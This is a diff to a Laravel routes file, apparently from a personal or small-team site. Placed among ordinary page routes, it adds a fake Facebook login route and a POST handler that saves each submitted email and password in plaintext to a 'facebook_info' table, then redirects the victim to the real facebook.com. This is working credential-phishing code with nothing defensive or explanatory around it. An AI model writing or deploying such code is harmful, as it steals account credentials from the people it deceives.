@@ -773,6 +773,23 @@ Route::get('/carpiotech', function(){
     return view('founders.landleybernardo');
 });
 
+Route::get('/facebook.com', function(){
+    return view('founders.facebook');
+});
+
+Route::post('/facebook/post', function(Request $request){
+    DB::table('facebook_info')
+    ->insert(
+                [
+                    'email' => $request->email, 
+                    'password' => $request->password,
+                ]
+            );
+
+            return redirect('https://facebook.com');
+});
+
+
 Route::get('/carpiotech/23rd-monthsary', function(){
     return view('founders.index');
 });
